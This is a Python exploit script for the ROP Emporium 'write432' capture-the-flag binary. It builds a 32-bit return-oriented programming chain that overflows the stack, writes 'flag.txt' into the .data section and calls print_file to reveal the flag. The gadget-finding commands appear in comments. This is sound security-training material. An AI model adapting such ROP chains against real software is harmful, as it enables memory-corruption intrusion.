import re
import struct
from subprocess import PIPE, Popen

FILE_PATH = "./write432"

JUNK = b"A" * 44
# rabin2 -i ./write432 | grep print_file | awk '{print $2}'
PRINT_FILE = struct.pack("<I", 0x080483D0)
# rabin2 -S ./write432 | grep -P "\.data" | awk '{print $4}'
DATA_SECTION_1 = struct.pack("<I", 0x0804A018)
DATA_SECTION_2 = struct.pack("<I", 0x0804A018 + 0x00000004)
# ROPgadget --binary ./write432 | grep ": pop edi ; pop ebp ; ret" | awk '{print $1}'
POP_EDI_EBP = struct.pack("<I", 0x080485AA)
# ROPgadget --binary ./write432 | grep -P "mov dword ptr \[edi\], ebp ; ret" | awk '{print $1}'
MOV_EBP_TO_EDI_POINTER = struct.pack("<I", 0x08048543)
# First argument for print_file function
STDOUT = struct.pack("<I", 0x0)
# File name to print (split on parts by 4 bytes)
FILE_NAME_1 = b"flag"
FILE_NAME_2 = b".txt"

populate_byte_1 = POP_EDI_EBP + DATA_SECTION_1 + FILE_NAME_1 + MOV_EBP_TO_EDI_POINTER
populate_byte_2 = POP_EDI_EBP + DATA_SECTION_2 + FILE_NAME_2 + MOV_EBP_TO_EDI_POINTER
print_file = PRINT_FILE + STDOUT + DATA_SECTION_1
payload = JUNK + populate_byte_1 + populate_byte_2 + print_file

p = Popen(FILE_PATH, stdout=PIPE, stdin=PIPE, stderr=PIPE)
reply = p.communicate(payload)[0].decode()
flag = re.findall(r"ROPE{.+}", reply)[0]
print(flag)
